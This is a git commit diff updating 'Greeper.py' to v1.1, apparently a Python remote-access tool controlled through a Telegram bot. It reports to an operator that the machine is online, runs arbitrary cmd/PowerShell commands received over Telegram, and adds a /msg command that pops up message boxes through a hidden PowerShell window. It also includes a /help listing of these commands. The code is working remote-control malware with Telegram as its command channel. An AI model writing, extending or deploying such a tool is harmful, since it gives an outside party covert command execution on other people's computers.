e62a7431d8588d01a9bbac601cc5887e46eaa4bc
GodInReach! <giridharan190507@gmail.com>
2025-05-24 21:02:51 +0530

    Update: Greeper v1.1

--- Greeper.py
+++ Greeper.py
@@ -1,7 +1,6 @@
-#GREEPER V1.0
+#GREEPER V1.1
 
 import os
-import time
 import subprocess as sp
 try:import telebot
 except:os.system("pip install telebot")
@@ -9,7 +8,7 @@ except:os.system("pip install telebot")
 bot = telebot.TeleBot("YOUR_BOT_TOKEN")
 user = "YOUR_USER_ID"
 
-bot.send_message(user,"Greeper is online!")
+bot.send_message(user,"Greeper is online!\nSend /help for help")
 
 @bot.message_handler(commands=["cmd"])
 def cmd(msg):
@@ -41,8 +40,55 @@ def cmd(msg):
 @bot.message_handler(commands=['terminate'])
 def terminate(message):
     bot.send_message(user,"Greeper is offline!")
-    term = 1
     bot.stop_polling()
     exit()
+
+@bot.message_handler(commands=['msg'])
+def msg(message):
+    message_content = ' '.join(message.text.split()[1:]).replace("'", "''")
+    if message_content == "":
+        bot.reply_to(message,"Empty Message!")
+        return
+    ps_script = f"""
+    Add-Type -AssemblyName System.Windows.Forms;
+    Add-Type -AssemblyName System.Drawing;
+    $form = New-Object System.Windows.Forms.Form;
+    $form.Text = "MSG from Greeper";
+    $form.TopMost = $true;
+    $form.AutoSize = $true;
+    $form.AutoSizeMode = [System.Windows.Forms.AutoSizeMode]::GrowAndShrink;
+    $form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen;
+    $label = New-Object System.Windows.Forms.Label;
+    $label.Text = '{message_content}';
+    $label.AutoSize = $true;
+    $label.MaximumSize = New-Object System.Drawing.Size(400, 0);  # Wider maximum width
+    $label.Font = New-Object System.Drawing.Font('Microsoft Sans Serif', 12, [System.Drawing.FontStyle]::Regular);
+    $label.Location = New-Object System.Drawing.Point(20, 20);
+    $button = New-Object System.Windows.Forms.Button;
+    $button.Text = "OK";
+    $button.Font = New-Object System.Drawing.Font('Microsoft Sans Serif', 12, [System.Drawing.FontStyle]::Regular);
+    $button.Size = New-Object System.Drawing.Size(100, 40);
+    $button.Location = New-Object System.Drawing.Point(150, 80);
+    $button.Add_Click({{ $form.Close() }});
+    $form.Controls.Add($label);
+    $form.Controls.Add($button);
+    [void] $form.ShowDialog();
+    """
+    sp.Popen(['powershell', '-command', ps_script],creationflags=sp.CREATE_NO_WINDOW)
+    bot.reply_to(message,"Message box displayed sucessfully")
+
+@bot.message_handler(commands=['help'])
+def help(message):
+    bot.reply_to(message,"""
+Commands:
+                 
+1. /cmd <command> - Execute cmd/ps commands
+2. /msg <message to display> - displays msg box
+3. /terminate - Terminate current session
+4. /help - Displays this message
+                 
+Replace <> with parameters
+Ex: /cmd dir
+""")
 
 bot.polling(non_stop=True)
